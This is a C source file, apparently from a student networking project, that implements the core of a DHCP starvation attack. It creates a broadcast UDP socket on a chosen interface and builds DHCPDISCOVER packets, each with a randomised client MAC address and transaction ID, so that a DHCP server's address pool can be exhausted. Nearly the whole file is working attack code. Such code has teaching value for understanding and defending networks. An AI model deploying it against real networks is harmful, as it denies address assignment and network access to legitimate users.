#include "ipk-dhcpstarve_api.h"

/* interface name passed via cml line argument */
char interface_cmd[IFNAMSIZ];
/* MAC address used as HARDWARE ADDRESS in DISCOVERY packet */
unsigned char MAC_address[MAC_ADDRESS_SIZE];
/* DHCP message used in DISCOVERY packet */
dhcp_message_t dhcp_message;

/* call srand flag */
static int generate_seed = 1;


/*
** Parses the command line arguments and sets globals
** returns 0 on error
*/
int parse_cmd(int argc, char **argv)
{
    if (argc != 3 || strcmp(argv[1], "-i"))
        return 0;

    strncpy(interface_cmd, argv[2], IFNAMSIZ);
    return 1;
}

/*
** Creates a DHCP socket
** returns -1 on error
*/
int create_DHCP_socket(void)
{
    int sock;
    struct sockaddr_in client_addr;     // https://www.gta.ufrj.br/ensino/eel878/sockets/sockaddr_inman.html
    struct ifreq interface;             // http://man7.org/linux/man-pages/man7/netdevice.7.html
    int status;
    int one = 1;

    /* Set binding address */
    bzero(&client_addr, sizeof(client_addr));
    client_addr.sin_family = AF_INET;
    client_addr.sin_port = htons(DHCP_CLIENT_PORT);
    client_addr.sin_addr.s_addr = INADDR_ANY;

    /* Create an UDP (SOCK_DGRAM) socket */
    sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    
    if (sock < 0) {
        perror("Failed to create a socket");
        return -1;
    }

    /* Set SO_REUSEADDR flag */
    /* https://stackoverflow.com/questions/21515946/sol-socket-in-getsockopt */
    /* https://stackoverflow.com/questions/577885/uses-of-so-reuseaddr */
    status = setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
    if (status < 0) {
        perror("Failed to set SO_REUSEADDR flag");
        close(sock);
        return -1;
    }

    /* DISCOVERY packets need to be broadcasted -> set SO_BROADCAST flag */
    /* https://stackoverflow.com/questions/16217958/why-do-we-need-socketoptions-so-broadcast-to-enable-broadcast */
    status = setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &one, sizeof(one));
    if (status < 0) {
        perror("Failed to set SO_BROADCAST flag");
        close(sock);
        return -1;
    }

    /* Bind socket to a network interface */
    /* https://stackoverflow.com/questions/14478167/bind-socket-to-network-interface */
    strncpy(interface.ifr_name, interface_cmd, IFNAMSIZ);
    status = setsockopt(sock, SOL_SOCKET, SO_BINDTODEVICE, (void *)&interface, sizeof(interface));
    if (status < 0) {
        perror("Failed to bind socket to interface");
        close(sock);
        return -1;
    }

    /* Bind the socket to the address */
    status = bind(sock, (struct sockaddr *)&client_addr, sizeof(client_addr));
    if (status < 0) {
        perror("Failed to bind socket to the address");
        close(sock);
        return -1;
    }
    
    return sock;
}

/*
** Broadcasts a DHCP message
** return -1 on failure
*/
int dhcp_message_broadcast(int sock)
{
    static struct sockaddr_in broadcast;
    static int set_broadcast = 1;

    if (set_broadcast) {
        broadcast.sin_family = AF_INET;
        broadcast.sin_port = htons(DHCP_SERVER_PORT);
        broadcast.sin_addr.s_addr = INADDR_BROADCAST;
        bzero(&broadcast.sin_zero, sizeof(broadcast.sin_zero));

        set_broadcast = 0;
    }
    
    int status = sendto(sock, &dhcp_message, sizeof(dhcp_message), 0, (struct sockaddr *)&broadcast, sizeof(broadcast));
    return status;
}


/*
** Generates a random MAC adress
*/
void generate_MAC_address(void)
{
    if (generate_seed) {
        srand(time(NULL));
        generate_seed = 0;
    }

    for (int i = 0; i < MAC_ADDRESS_SIZE; i++)
        MAC_address[i] = (unsigned char) (rand() % 256);
}

/*
** Generate a random transaction id
*/
uint32_t generate_transaction_id(void)
{
    if (generate_seed) {
        srand(time(NULL));
        generate_seed = 0;   
    }

    int id = rand();
    return htonl(id);
}

/*
** Initializes dhcp_message
*/
void dhcp_message_innit(void)
{
    bzero(&dhcp_message, sizeof(dhcp_message));
}

/*
** Sets dhcp_message to a discovery message
** MAC address is not set
*/
/* https://tools.ietf.org/html/rfc2131#page-10 */
/* https://tools.ietf.org/html/rfc2131#page-11 */
/* https://www.ietf.org/rfc/rfc2132.txt section 9.6 */
/* https://en.wikipedia.org/wiki/Dynamic_Host_Configuration_Protocol#DHCP_discovery */
void dhcp_set_discovery_message(void)
{
    /*
    ** Clearing dhcp_message is not necessary since we
    ** are clearing the unset properties in next steps
    ** We just want to be explicit
    */
    dhcp_message_innit();

    /* Message opcode */
    dhcp_message.op = BOOTREQUEST;
    /* Hardware address type */
    dhcp_message.htype = DHCP_HTYPE_ETH;
    /* Hardware address length */
    dhcp_message.hlen = DHCP_HLEN_ETH;
    /* Client sets to zero, optionally used by relay agents
    ** when booting via a relay agent. */
    dhcp_message.hops = 0;
    /* Transaction ID, not necessary in this step */
    dhcp_message.xid = generate_transaction_id();
    /* Seconds elapsed since client began
    ** address acquisition or renewal process
    ** Not really relevant to us */
    dhcp_message.secs = 0;
    /* Flags --> set broadcast flag */
    dhcp_message.flags = htons(DHCP_BROADCAST_FLAG);
    /* C/Y/S/G/iaddr shall be 0 */
    bzero(&dhcp_message.ciaddr, sizeof(dhcp_message.ciaddr));
    bzero(&dhcp_message.yiaddr, sizeof(dhcp_message.yiaddr));
    bzero(&dhcp_message.siaddr, sizeof(dhcp_message.siaddr));
    bzero(&dhcp_message.giaddr, sizeof(dhcp_message.giaddr));
    /* Clinet HARDWARE address, not necessary in this step */
    memcpy(&dhcp_message.chaddr, MAC_address, MAC_ADDRESS_SIZE);
    /* Magic cookie */
    memcpy(&dhcp_message.options, DHCP_MAGIC_COOKIE, DHCP_MAGIC_COOKIE_LEN);
    /* Message type */
    dhcp_message.options[DHCP_MAGIC_COOKIE_LEN + 0] = DHCP_MESSAGE_TYPE;
    dhcp_message.options[DHCP_MAGIC_COOKIE_LEN + 1] = DHCP_MESSAGE_TYPE_LEN;
    dhcp_message.options[DHCP_MAGIC_COOKIE_LEN + 2] = DHCPDISCOVER;
    /* End option */
    dhcp_message.options[DHCP_MAGIC_COOKIE_LEN + 3] = DHCP_END_OPTION;
    /* Zero out the rest as promissed :^) */
    unsigned char *rest_start = &dhcp_message.options[DHCP_MAGIC_COOKIE_LEN + 4];
    unsigned char *rest_end = (unsigned char *)&dhcp_message + sizeof(dhcp_message);
    int n_bytes = rest_end - rest_start;
    bzero(rest_start, n_bytes);
}

/*
** Changes the MAC address in dhcp_message
*/
void dhcp_message_set_random_MAC(void)
{
    generate_MAC_address();
    memcpy(&dhcp_message.chaddr, MAC_address, MAC_ADDRESS_SIZE);
}

/*
** Changes the transaction ID in dhcp_message
*/
void dhcp_message_set_random_transaction_id(void)
{
    dhcp_message.xid = generate_transaction_id();
}